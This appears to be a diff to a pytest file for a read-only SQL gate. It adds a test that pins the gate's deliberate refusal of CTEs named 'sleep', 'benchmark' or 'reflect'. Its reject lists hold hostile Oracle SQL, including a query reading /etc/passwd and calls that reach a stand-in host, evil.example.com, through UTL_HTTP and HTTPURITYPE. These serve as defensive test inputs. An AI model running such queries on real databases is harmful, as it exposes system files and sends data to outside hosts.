@@ -477,6 +477,7 @@ REJECT_DIALECT_SIDE_EFFECT_FUNCTIONS = [
     "SELECT DBMS_LOCK.REQUEST(1, 6, 10, TRUE) FROM dual",
     "SELECT DBMS_PIPE.RECEIVE_MESSAGE('p', 10) FROM dual",
     "SELECT DBMS_XMLGEN.GETXML('SELECT 1 FROM dual') FROM dual",
+    "SELECT DBMS_XSLPROCESSOR.READ2CLOB('/etc', 'passwd') FROM dual",
     "SELECT UTL_HTTP.REQUEST('http://evil.example.com') FROM dual",
     "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.example.com') FROM dual",
     "SELECT HTTPURITYPE('http://evil.example.com').GETCLOB() FROM dual",
@@ -495,6 +496,39 @@ def test_rejects_dialect_side_effect_functions(sql: str) -> None:
     pinning separately from the write/DDL vectors that three other steps would also catch.
     """
     assert check_read_only(sql) is not None, f"Side-effecting function not blocked: {sql!r}"
+
+
+# The cost of the bare-word entries, pinned as a refusal rather than argued in a comment.
+#
+# `\bWORD\s*\(` matches the two SQL constructs with that shape — a function call, and the column
+# list of a CTE or derived table — and cannot tell them apart. These four are legitimate analytics
+# SQL that `origin/main` accepted and this gate now refuses, naming a function the statement does
+# not contain. They are here, not in the false-positive corpus, because refusing them is the
+# CHOSEN behaviour: a lookaround narrow enough to admit them would let a real call through in some
+# position, and this gate fails closed. `test_false_positive_guard_legitimate_analytics_sql` pins
+# the neighbouring shapes that do still pass (`sleep_minutes`, `AVG(sleep)`, a `benchmark` column),
+# so the boundary is recorded from both sides. If the trade is ever judged the wrong way round,
+# the fix is to drop `sleep` and `benchmark` from the deny-list — they are pure time-wasters, and
+# the executor's per-statement timeout already bounds them — and to move these rows across.
+REJECT_CTE_NAME_COLLISION = [
+    "WITH benchmark (region, target) AS (SELECT region, 100 FROM regions) SELECT region FROM benchmark",
+    "WITH sleep (patient_id, hours) AS (SELECT patient_id, hours FROM sleep_log) SELECT AVG(hours) FROM sleep",
+    "WITH reflect (id, score) AS (SELECT id, score FROM surveys) SELECT id FROM reflect",
+    "SELECT a.region FROM actuals a JOIN (SELECT region FROM t) AS benchmark (region) ON a.region = benchmark.region",
+]
+
+
+@pytest.mark.parametrize("sql", REJECT_CTE_NAME_COLLISION)
+def test_a_cte_named_after_a_denied_function_is_refused(sql: str) -> None:
+    """Pins the known over-refusal, and that it is the deny-list step producing it.
+
+    Asserting the STEP matters: if a later change made these pass, this test would fail and the
+    trade-off gets re-decided deliberately instead of drifting.
+    """
+    refusal = check_read_only(sql)
+    assert refusal is not None, f"expected the pinned over-refusal: {sql!r}"
+    assert "is not allowed" in refusal.detail, refusal.detail
+    assert refusal.remediation == _REMEDIATION["dangerous_function"]
 
 
 def test_dialect_side_effect_rejection_names_the_function() -> None:
